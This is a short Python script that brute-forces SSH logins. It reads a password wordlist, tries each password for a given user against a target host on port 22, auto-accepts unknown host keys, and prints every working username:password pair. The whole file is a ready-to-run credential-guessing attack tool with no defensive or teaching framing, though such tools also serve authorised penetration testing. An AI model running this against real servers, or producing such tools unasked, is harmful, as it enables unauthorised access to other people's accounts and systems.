import argparse
import paramiko
from paramiko.ssh_exception import BadHostKeyException, AuthenticationException, SSHException
import socket

def SSHConnect(host,passlist,user):
    succ_auth=[]
    for password in passlist:
        #print(user,password)
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, 22, user, password)
            #print("Successful auhthentication: {} {}".format(user,password))
            succ_auth.append("{}:{}".format(user,password.decode("utf-8")))
        except (BadHostKeyException, socket.error) as e:
            print (e)
        except (AuthenticationException,SSHException) as auth:
            pass
    return succ_auth

def main():
    parser = argparse.ArgumentParser(description="BruteForce SSH")
    parser.add_argument("host",help="HostName or IP address of SSH Server")
    parser.add_argument("-P", "--passlist", help="Wordlist of passwords")
    parser.add_argument("-u", "--user", help="User name")

    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    #print(host,passlist,user)
    passw_list = []
    with open(passlist, "rb") as p:
        passw_list=p.read().splitlines()
    succ_auth=[]
    #print(passw_list)
    succ_auth = SSHConnect(host,passw_list,user)
    if succ_auth:
        for auth in succ_auth:
            print("Successful authenthincation: {}".format(auth))

if __name__ == "__main__":
    main()